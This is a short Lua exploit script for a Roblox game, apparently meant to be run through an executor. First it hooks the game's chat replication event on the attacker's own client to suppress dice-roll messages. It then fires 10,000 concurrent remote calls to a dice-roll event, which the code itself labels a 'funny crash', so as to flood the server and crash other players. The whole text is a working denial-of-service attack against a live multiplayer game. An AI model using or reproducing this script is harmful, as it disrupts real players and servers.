-- stops you from crashing yourself
if not _G.VACCINATED then
    for i,v in pairs(getconnections(game.ReplicatedStorage.DefinEvents.InteractingReplicateSendSystemChat.OnClientEvent)) do
        local old
        old = hookfunction(v.Function, function(...)
            local args = {...}
            for i,v in pairs(args) do
                if type(v) == 'string' and (v:lower():find(' faces...') or v:lower():find(' rolls a ')) then
                    return
                end
            end

            return old(...)
        end)
    end
end
_G.VACCINATED = true


-- funny crash
local Interaction = game:GetService('ReplicatedStorage').Interacting
local DiceEvent = game:GetService('ReplicatedStorage').DefinEvents.InteractingRequestRollDice
for i = 1, 10000 do
    task.spawn(function()
        game:GetService('ReplicatedStorage').DefinEvents.InteractingRequestRollDice:InvokeServer(Interaction, 6, 20) -- maxmimum amount
    end)
end